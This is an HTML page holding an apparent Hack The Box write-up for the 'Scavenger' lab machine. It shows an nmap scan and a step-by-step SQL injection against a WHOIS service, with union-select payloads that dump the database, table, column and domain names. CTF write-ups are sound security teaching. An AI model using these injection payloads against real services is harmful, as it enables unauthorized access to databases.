@@ -1,0 +1,818 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Focus on the good stuff!">
+    <meta name="author" content="Sabe Barker">
+
+    <title>Scavenger - Hack The Box · Sabe Barker</title>
+
+    <link rel="canonical" href="https://sabebarker.com/writeups/hackthebox/machines/scavenger/">
+
+    <!-- Bootstrap core CSS -->
+    <link href="/assets/css/bootstrap.min.css" rel="stylesheet">
+	<!-- Custom CSS -->
+    <link href="/assets/css/sabe.css" rel="stylesheet">
+    <!-- Lightbox -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.css" rel="stylesheet">
+    <!-- Favicons -->
+	<link rel="apple-touch-icon" href="/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
+	<link rel="icon" href="/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+	<link rel="icon" href="/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
+	<link rel="manifest" href="/assets/img/favicons/manifest.json">
+	<link rel="mask-icon" href="/assets/img/favicons/safari-pinned-tab.svg" color="#8248f6">
+	<link rel="icon" href="/assets/img/favicons/favicon.ico">
+	<meta name="apple-mobile-web-app-title" content="Sabe Barker">
+	<meta name="application-name" content="Sabe Barker">
+	<meta name="msapplication-TileColor" content="#fff">
+	<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
+	<meta name="theme-color" content="#fff">
+	
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@sabebarker">
+    <meta name="twitter:creator" content="@sabebarker">
+    <meta name="twitter:title" content="Scavenger - Hack The Box · Sabe Barker">
+    <meta name="twitter:description" content="Focus on the good stuff!">
+    <meta name="twitter:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/scavenger/scavenger_infocard.png">
+
+    <!-- Facebook -->
+    <meta property="og:url" content="https://sabebarker.com/writeups/hackthebox/machines/scavenger/" />
+    <meta property="og:title" content="Scavenger - Hack The Box · Sabe Barker">
+    <meta property="og:description" content="Focus on the good stuff!">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/scavenger/scavenger_infocard.png">
+    <meta property="og:image:secure_url" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/scavenger/scavenger_infocard.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-151243373-1"></script>
+	<script>
+  		window.dataLayer = window.dataLayer || [];
+  		function gtag(){dataLayer.push(arguments);}
+  		gtag('js', new Date());
+
+  		gtag('config', 'UA-151243373-1');
+	</script>
+  </head>
+  <body>
+    <a class="skippy sr-only sr-only-focusable" href="#content">
+      <span class="skippy-text">Skip to main content</span>
+    </a>
+
+    <header class="navbar navbar-expand navbar-light flex-column flex-md-row sb-navbar">
+      <a class="navbar-brand mr-0 mr-md-2" href="/" aria-label="Sabe Barker"><svg id="Layer_35" enable-background="new 0 0 64 64" height="36" viewBox="0 0 64 64" width="36" class="d-inline-block align-top" style="margin-right: 10px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="32" x2="32" y1="63" y2="1"><stop offset="0" stop-color="#9f2fff"/><stop offset="1" stop-color="#0bb1d3"/></linearGradient><path d="m42.363 39.397 1.596 1.205c-.446.59-.85 1.22-1.202 1.872l-1.761-.949c.4-.742.86-1.458 1.367-2.128zm.887-1.079 1.5 1.322c1.863-2.112 3.182-4.677 3.814-7.416l-1.949-.45c-.557 2.417-1.721 4.68-3.365 6.544zm-4.689-23.805.878-1.797c-2.33-1.139-4.833-1.716-7.439-1.716s-5.109.577-7.439 1.716l.878 1.797c4.108-2.008 9.014-2.008 13.122 0zm14.439 13.487v.396c0 5.149-1.884 10.104-5.304 13.952-1.738 1.956-2.696 4.473-2.696 7.09v.562c0 3.859-3.14 7-7 7h-12c-3.86 0-7-3.141-7-7v-.562c0-2.616-.958-5.134-2.696-7.09-3.42-3.848-5.304-8.803-5.304-13.952v-.396c0-11.58 9.42-21 21-21s21 9.42 21 21zm-2 0c0-10.477-8.523-19-19-19s-19 8.523-19 19v.396c0 4.659 1.705 9.142 4.799 12.624 2.064 2.321 3.201 5.311 3.201 8.418v.562c0 2.757 2.243 5 5 5h12c2.757 0 5-2.243 5-5v-.562c0-3.106 1.137-6.097 3.201-8.418 3.094-3.482 4.799-7.965 4.799-12.624zm-10 18v4c0 1.654-1.346 3-3 3h-12c-1.654 0-3-1.346-3-3v-4c0-1.654 1.346-3 3-3h12c1.654 0 3 1.346 3 3zm-3-1h-1v2h2v-1c0-.552-.449-1-1-1zm-9 4v2h2v-2zm2-2v-2h-2v2zm2 4h2v-2h-2zm2-4v-2h-2v2zm-10-1v1h2v-2h-1c-.551 0-1 .448-1 1zm1 5h1v-2h-2v1c0 .552.449 1 1 1zm13-1v-1h-2v2h1c.551 0 1-.448 1-1zm-8.618-19h3.236l2.105 4.211c.181.361.277.767.277 1.171 0 1.443-1.174 2.618-2.618 2.618h-2.764c-1.444 0-2.618-1.175-2.618-2.618 0-.404.096-.81.276-1.171zm1.236 2-1.553 3.105c-.043.085-.065.181-.065.277 0 .341.277.618.618.618h2.764c.341 0 .618-.277.618-.618 0-.096-.022-.191-.065-.276l-1.553-3.106zm14.089-16.293-1.218 1.218c2.149 1.225 3.511 3.509 3.511 6.075 0 3.86-3.14 7-7 7-3.067 0-5.987-1.962-6.943-4.667l-.21-.595 10.446-10.446zm-2.708 2.709-6.809 6.809c.862 1.616 2.821 2.775 4.81 2.775 2.757 0 5-2.243 5-5 0-1.989-1.209-3.798-3.001-4.584zm-19.999 11.584c-3.86 0-7-3.14-7-7 0-2.567 1.362-4.851 3.511-6.075l-1.218-1.218 1.414-1.414 10.446 10.446-.21.595c-.956 2.704-3.876 4.666-6.943 4.666zm0-2c1.989 0 3.948-1.159 4.811-2.775l-6.809-6.809c-1.793.786-3.002 2.595-3.002 4.584 0 2.757 2.243 5 5 5zm-14.098-17.676 1.49 1.334c5.498-6.138 13.374-9.658 21.608-9.658v-2c-8.802 0-17.221 3.763-23.098 10.324zm23.098 49.676v2c9.308 0 18.04-4.128 23.958-11.325l-1.545-1.27c-5.537 6.734-13.706 10.595-22.413 10.595zm-28.969-27.649c.032.688.088 1.383.168 2.062l1.986-.232c-.074-.634-.127-1.28-.156-1.922zm4.132 9.256c-.252-.592-.486-1.196-.693-1.799l-1.891.652c.223.646.474 1.297.745 1.932zm-1.256-3.643c-.164-.615-.309-1.247-.429-1.879l-1.965.375c.129.679.285 1.358.461 2.02zm52.186-13.928c.165.617.309 1.249.429 1.879l1.965-.375c-.129-.677-.284-1.356-.461-2.02zm2.876 5.613c-.032-.689-.088-1.383-.168-2.063l-1.986.233c.074.633.127 1.28.156 1.922zm-4.132-9.256c.252.589.485 1.194.694 1.798l1.891-.652c-.224-.65-.475-1.3-.746-1.932zm6.163 21.607c0 1.654-1.346 3-3 3-.117 0-.228-.021-.342-.035-.628 1.241-1.323 2.455-2.112 3.602l-1.647-1.135c.733-1.063 1.377-2.189 1.96-3.338-.53-.541-.859-1.279-.859-2.094 0-1.654 1.346-3 3-3s3 1.346 3 3zm-2 0c0-.552-.449-1-1-1s-1 .448-1 1 .449 1 1 1 1-.448 1-1zm-52.199-28.404c-1.014 1.35-1.904 2.795-2.668 4.299.535.542.867 1.285.867 2.105 0 1.654-1.346 3-3 3s-3-1.346-3-3 1.346-3 3-3c.112 0 .219.021.328.033.821-1.623 1.779-3.183 2.874-4.639zm-3.801 6.404c0-.551-.449-1-1-1s-1 .449-1 1 .449 1 1 1 1-.449 1-1z" fill="url(#SVGID_1_)"/></svg>{ sabebarker }
+      </a>
+
+      <div class="navbar-nav-scroll">
+        <ul class="navbar-nav sb-navbar-nav flex-row">
+          <li class="nav-item">
+            <a class="nav-link " href="/search">
+        <svg height="15" class="octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search" viewBox="0 0 16 16" version="1.1" width="15" aria-hidden="true"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0013 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 000-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"/></svg>
+      </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/">
+	      Home
+	     </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/blog">
+	      Blog
+	    </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link active" href="/writeups">
+	      Writeups
+	    </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/tools">
+	      Tools
+	    </a>
+          </li>
+        </ul>
+      </div>
+
+      <ul class="navbar-nav flex-row ml-md-auto d-none d-md-flex">
+        <li class="nav-item">
+          <a class="nav-link p-2" href="https://github.com/sabebarker" target="_blank" rel="noopener" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 512 499.36" role="img" focusable="false"><title>GitHub</title><path fill="currentColor" fill-rule="evenodd" d="M256 0C114.64 0 0 114.61 0 256c0 113.09 73.34 209 175.08 242.9 12.8 2.35 17.47-5.56 17.47-12.34 0-6.08-.22-22.18-.35-43.54-71.2 15.49-86.2-34.34-86.2-34.34-11.64-29.57-28.42-37.45-28.42-37.45-23.27-15.84 1.73-15.55 1.73-15.55 25.69 1.81 39.21 26.38 39.21 26.38 22.84 39.12 59.92 27.82 74.5 21.27 2.33-16.54 8.94-27.82 16.25-34.22-56.84-6.43-116.6-28.43-116.6-126.49 0-27.95 10-50.8 26.35-68.69-2.63-6.48-11.42-32.5 2.51-67.75 0 0 21.49-6.88 70.4 26.24a242.65 242.65 0 0 1 128.18 0c48.87-33.13 70.33-26.24 70.33-26.24 14 35.25 5.18 61.27 2.55 67.75 16.41 17.9 26.31 40.75 26.31 68.69 0 98.35-59.85 120-116.88 126.32 9.19 7.9 17.38 23.53 17.38 47.41 0 34.22-.31 61.83-.31 70.23 0 6.85 4.61 14.81 17.6 12.31C438.72 464.97 512 369.08 512 256.02 512 114.62 397.37 0 256 0z"/></svg></a>
+       </li>
+       <li class="nav-item">
+         <a class="nav-link p-2" href="https://twitter.com/sabebarker" target="_blank" rel="noopener" aria-label="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 512 416.32" role="img" focusable="false"><title>Twitter</title><path fill="currentColor" d="M160.83 416.32c193.2 0 298.92-160.22 298.92-298.92 0-4.51 0-9-.2-13.52A214 214 0 0 0 512 49.38a212.93 212.93 0 0 1-60.44 16.6 105.7 105.7 0 0 0 46.3-58.19 209 209 0 0 1-66.79 25.37 105.09 105.09 0 0 0-181.73 71.91 116.12 116.12 0 0 0 2.66 24c-87.28-4.3-164.73-46.3-216.56-109.82A105.48 105.48 0 0 0 68 159.6a106.27 106.27 0 0 1-47.53-13.11v1.43a105.28 105.28 0 0 0 84.21 103.06 105.67 105.67 0 0 1-47.33 1.84 105.06 105.06 0 0 0 98.14 72.94A210.72 210.72 0 0 1 25 370.84a202.17 202.17 0 0 1-25-1.43 298.85 298.85 0 0 0 160.83 46.92"/></svg></a>
+       </li>
+       <li class="nav-item">
+         <a class="nav-link p-2" href="https://facebook.com/sabebarker2600" target="_blank" rel="noopener" aria-label="Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 24 24" role="img" focusable="false"><title>Facebook</title><path fill="currentColor" d="M210.787 234.832l68.31-22.883 22.1 65.977-68.309 22.882z"/><path fill="currentColor" d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg></a>
+       </li>
+      </ul>
+    </header>
+
+
+    <div class="container-fluid">
+      <div class="row flex-xl-nowrap">
+        <div class="col-12 col-md-3 col-xl-2 sb-sidebar">
+          <button class="btn btn-link sb-search-docs-toggle d-md-none p-0 ml-3" type="button" data-toggle="collapse" data-target="#sb-docs-nav" aria-controls="sb-docs-nav" aria-expanded="false" aria-label="Toggle docs navigation"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 30 30" role="img" focusable="false"><title>Menu</title><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"/></svg></button>
+
+<nav class="collapse sb-links" id="sb-docs-nav"><div class="sb-toc-item">
+      <a class="sb-toc-link" href="/writeups/hackthebox/getting-started/introduction/">
+        Getting Started
+      </a>
+
+      <ul class="nav sb-sidenav"><li>
+            <a href="/writeups/hackthebox/getting-started/introduction/">
+              Introduction
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/getting-started/basic-setup/">
+              Basic Setup
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/getting-started/vpn-setup/">
+              VPN Setup
+            </a>
+          </li></ul>
+    </div><div class="sb-toc-item active">
+      <a class="sb-toc-link" href="/writeups/hackthebox/machines/nest/">
+        Machines
+      </a>
+
+      <ul class="nav sb-sidenav"><li>
+            <a href="/writeups/hackthebox/machines/nest/">
+              Nest
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/resolute/">
+              Resolute
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/obscurity/">
+              Obscurity
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/openadmin/">
+              OpenAdmin
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/mango/">
+              Mango
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/traverxec/">
+              Traverxec
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/forest/">
+              Forest
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/postman/">
+              Postman
+            </a>
+          </li><li class="active sb-sidenav-active">
+            <a href="/writeups/hackthebox/machines/scavenger/">
+              Scavenger
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/json/">
+              Json
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/ai/">
+              AI
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/bitlab/">
+              Bitlab
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/craft/">
+              Craft
+            </a>
+          </li><li>
+            <a href="/writeups/hackthebox/machines/networked/">
+              Networked
+            </a>
+          </li></ul>
+    </div></nav>
+        </div>
+
+        
+          <div class="d-none d-xl-block col-xl-2 sb-toc">
+            <ul class="section-nav">
+<li class="toc-entry toc-h2"><a href="#enumeration">Enumeration</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#portscan">Portscan</a></li>
+<li class="toc-entry toc-h3"><a href="#domains">Domains</a></li>
+<li class="toc-entry toc-h3"><a href="#whois-service">WHOIS Service</a></li>
+<li class="toc-entry toc-h3"><a href="#more-domains">More Domains</a></li>
+<li class="toc-entry toc-h3"><a href="#dns-service">DNS Service</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#foothold">Foothold</a></li>
+<li class="toc-entry toc-h2"><a href="#user">User</a></li>
+<li class="toc-entry toc-h2"><a href="#root">Root</a></li>
+</ul>
+          </div>
+        
+
+        <main class="col-12 col-md-9 col-xl-8 py-md-3 pl-md-5 sb-content" role="main">
+          <h1 class="sb-title" id="content">Scavenger</h1>
+          <p class="sb-lead">Focus on the good stuff!</p>
+          <p class="text-center"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger_infocard.png" alt="HackTheBox Scavenger Machine Info Card" class="img-fluid" /></p>
+
+<p><strong>Scavenger</strong> is a hard difficulty machine and the first I have attempted on <em>HackTheBox</em>. It tests your knowledge in <em>basic enumeration, SQL injection, more enumeration, DNS service exploitation, uhuh more enumeration, yet more enumeration, even more enumeration, basic reverse engineering/debugging</em>.</p>
+
+<p>Be sure to checkout the <a href="/writeups/hackthebox/getting-started/basic-setup/">Basic Setup</a> section  before you get started.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Like always, enumeration is our first port of call. Let’s take a look at the machine and see what we are dealing with.</p>
+
+<h3 id="portscan">Portscan</h3>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">portscan scavenger.htb
+Grabbing ports...
+Ports grabbed!
+Scanning...
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-02-07 23:18 PST
+Nmap scan report <span class="k">for </span>scavenger.htb <span class="o">(</span>10.10.10.155<span class="o">)</span>
+Host is up <span class="o">(</span>0.23s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE  SERVICE  VERSION
+20/tcp closed ftp-data
+21/tcp open   ftp      vsftpd 3.0.3
+22/tcp open   ssh      OpenSSH 7.4p1 Debian 10+deb9u4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 <span class="nb">df</span>:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc <span class="o">(</span>RSA<span class="o">)</span>
+|   256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 <span class="o">(</span>ED25519<span class="o">)</span>
+25/tcp open   smtp     Exim smtpd 4.89
+| smtp-commands: ib01.supersechosting.htb Hello scavenger.htb <span class="o">[</span>10.10.14.40], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP, 
+|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
+43/tcp open   whois?
+| fingerprint-strings: 
+|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
+|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+|     This query returned 0 object
+|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+|_    1267 <span class="o">(</span>HY000<span class="o">)</span>: Illegal mix of collations <span class="o">(</span>utf8mb4_general_ci,IMPLICIT<span class="o">)</span> and <span class="o">(</span>utf8_general_ci,COERCIBLE<span class="o">)</span> <span class="k">for </span>operation <span class="s1">'like'</span>
+53/tcp open   domain   ISC BIND 9.10.3-P4 <span class="o">(</span>Debian Linux<span class="o">)</span>
+| dns-nsid: 
+|_  bind.version: 9.10.3-P4-Debian
+80/tcp open   http     Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
+Service Info: Host: ib01.supersechosting.htb<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>124.07 seconds</code></pre></figure>
+
+<h3 id="domains">Domains</h3>
+
+<p>Navigating to port <code class="highlighter-rouge">80</code> show us the page:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb.png" alt="Scavenger VHost Error Screenshot" class="img-fluid" /></a></p>
+
+<p>As we can see from the <code class="highlighter-rouge">nmap</code> scan the <code class="highlighter-rouge">whois</code> service on port <code class="highlighter-rouge">43</code> gives us the vhost <code class="highlighter-rouge">http://www.supersechosting.htb</code>.</p>
+
+<p>Adding this to our <code class="highlighter-rouge">/etc/hosts</code> reveals the page:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_www.supersechosting.htb.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_www.supersechosting.htb.png" alt="Scavenger SuperSecHosting Screenshot" class="img-fluid" /></a></p>
+
+<p>This page gives us some extra info and tells us that a <em>LAMP</em> stack is preinstalled with <em>SSH</em> and <em>FTP</em> access.</p>
+
+<p>From the information we gather from the page as well as our <code class="highlighter-rouge">nmap</code> scan we have all versions for the stack:</p>
+
+<p><strong>L</strong>inux - <em>Debian 10 (Buster)</em></p>
+
+<p><strong>A</strong>pache - <em>2.4.25</em></p>
+
+<p><strong>M</strong>ySQL - <em>MariaDB10.1.37</em></p>
+
+<p><strong>P</strong>HP - <em>7</em></p>
+
+<p>Along with <code class="highlighter-rouge">OpenSSH 7.4p1</code> and <code class="highlighter-rouge">vsftpd 3.0.3</code>.</p>
+
+<p>We also see a couple more domains listed for the <code class="highlighter-rouge">DNS</code> server <code class="highlighter-rouge">dns.supersechosting.htb</code> and <code class="highlighter-rouge">WHOIS</code> server <code class="highlighter-rouge">whois.supersechosting.htb</code>. Let’s add those to our <code class="highlighter-rouge">/etc/hosts</code> incase we need them.</p>
+
+<p>Since this is a hosting service and also self proclaimed <code class="highlighter-rouge">First authorized registrar for new .htb top level domain</code> we can assume there may be some other sites laying about.</p>
+
+<p>Considering we know that the <code class="highlighter-rouge">whois</code> service is running <em>MariaDB</em> and we can see it is potentially suscpeptible to <em>SQL Injection</em> from the output <code class="highlighter-rouge">1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like'</code> we will start with this service.</p>
+
+<h3 id="whois-service">WHOIS Service</h3>
+
+<p>Using the <code class="highlighter-rouge">whois</code> command we can cause <em>MariaDB</em> to error out confirming <em>SQL Injection</em>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">whois <span class="nt">-h</span> scavenger.htb <span class="nt">-p</span> 43 <span class="nt">-H</span> <span class="s2">"'"</span>
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% <span class="k">for </span>more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+1064 <span class="o">(</span>42000<span class="o">)</span>: You have an error <span class="k">in </span>your SQL syntax<span class="p">;</span> check the manual that corresponds to your MariaDB server version <span class="k">for </span>the right syntax to use near <span class="s1">''''</span><span class="o">)</span> limit 1<span class="s1">' at line 1</span></code></pre></figure>
+
+<p>We can see here from the error output that the query contains a parantheses <code class="highlighter-rouge">)</code>.</p>
+
+<p>Admittedley I tried to use a <code class="highlighter-rouge">1=1</code> query but I must have used the <code class="highlighter-rouge">-H</code> flag which hides the legal disclaimers but also filters the extra output. However, a fellow HTB user kindly informed me that it does in fact work without that flag.</p>
+
+<p>So using the following command we can dump extra domain entries from the database:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">whois <span class="nt">-h</span> scavenger.htb <span class="nt">-p</span> 43 <span class="s2">"') or 1=1 -- -"</span></code></pre></figure>
+
+<p>To be honest I am quite happy I missed this because I learnt a lot going the long winded way as follows.</p>
+
+<p>With the error information we can start mapping our structure with <code class="highlighter-rouge">union</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">whois <span class="nt">-h</span> scavenger.htb <span class="nt">-p</span> 43 <span class="nt">-H</span> <span class="s2">"') union all select null -- -"</span>                               
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% <span class="k">for </span>more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+1222 <span class="o">(</span>21000<span class="o">)</span>: The used SELECT statements have a different number of columns</code></pre></figure>
+
+<p>The outputted error tells us that there is more than one column.</p>
+
+<p>We keep adding <code class="highlighter-rouge">null</code> to map out our entry point:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">whois <span class="nt">-h</span> scavenger.htb <span class="nt">-p</span> 43 <span class="nt">-H</span> <span class="s2">"') union all select null,null -- -"</span></code></pre></figure>
+
+<p>Adding two <code class="highlighter-rouge">null</code> inputs gives us no output at all. Adding three causes another error. So <em>two</em> it is!</p>
+
+<p>Now we test to see which position is <em>vulnerable</em>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">whois <span class="nt">-h</span> scavenger.htb <span class="nt">-p</span> 43 <span class="nt">-H</span> <span class="s2">"') union all select 1,null -- -"</span>                                                                                                                  
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% <span class="k">for </span>more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+1</code></pre></figure>
+
+<p>As we can see the query has returned our input so we know that this entry is vulnerable. Testing the other position returns no output so it is not vulnerable.</p>
+
+<p>With this information we can now try to dump some information:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">whois <span class="nt">-h</span> scavenger.htb <span class="nt">-p</span> 43 <span class="nt">-H</span> <span class="s2">"') UNION ALL SELECT group_concat(table_schema),null from information_schema.tables where table_schema=database() -- -"</span>                               
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% <span class="k">for </span>more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+whois</code></pre></figure>
+
+<p>Our query reveals a <em>database</em> called <code class="highlighter-rouge">whois</code>.</p>
+
+<p>Now let’s see if we can find some <em>tables</em>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">whois <span class="nt">-h</span> scavenger.htb <span class="nt">-p</span> 43 <span class="nt">-H</span> <span class="s2">"') UNION ALL SELECT group_concat(table_name),null from information_schema.tables where table_schema=database() -- -"</span>                                 
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% <span class="k">for </span>more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+customers</code></pre></figure>
+
+<p>Within this output we find a <em>table</em> called <code class="highlighter-rouge">customers</code>.</p>
+
+<p>We will also list the <em>columns</em>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">whois <span class="nt">-h</span> scavenger.htb <span class="nt">-p</span> 43 <span class="nt">-H</span> <span class="s2">"') UNION SELECT group_concat(column_name),null from information_schema.columns where table_schema=database() -- -"</span>                                   
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% <span class="k">for </span>more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+<span class="nb">id</span>,domain,data</code></pre></figure>
+
+<p>Looks like we have three columns. The <code class="highlighter-rouge">domain</code> column will hopefully point us to some other domains to enumerate!</p>
+
+<p>Finally, with the inforamtion we have gathered let’s dump the data:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">whois <span class="nt">-h</span> scavenger.htb <span class="nt">-p</span> 43 <span class="nt">-H</span> <span class="s2">"') UNION SELECT group_concat(domain),null from customers -- -"</span>                                   
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% <span class="k">for </span>more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+supersechosting.htb,justanotherblog.htb,pwnhats.htb,rentahacker.htb</code></pre></figure>
+
+<p>Nice! We find a bunch of domains.</p>
+
+<p>Let’s add these to our <code class="highlighter-rouge">/etc/hosts</code>. We find that we need to include <code class="highlighter-rouge">www</code> like we did for <code class="highlighter-rouge">supersechosting.htb</code>.</p>
+
+<p>In doing so we can now go check them out!</p>
+
+<h3 id="more-domains">More Domains</h3>
+
+<p>Taking a look we see that <code class="highlighter-rouge">justanotherblog.htb</code> is under construction:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_justanotherblog.htb.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_justanotherblog.htb.png" alt="Scavenger JustAnotherBlog Screenshot" class="img-fluid" /></a></p>
+
+<p>The domain <code class="highlighter-rouge">pwnhats.htb</code> is a <em>PrestaShop</em> store:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_pwnhats.htb.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_pwnhats.htb.png" alt="Scavenger Pwnhats PrestaShop Screenshot" class="img-fluid" /></a></p>
+
+<p>And <code class="highlighter-rouge">rentahacker.htb</code> is a <em>Wordpress</em> site:</p>
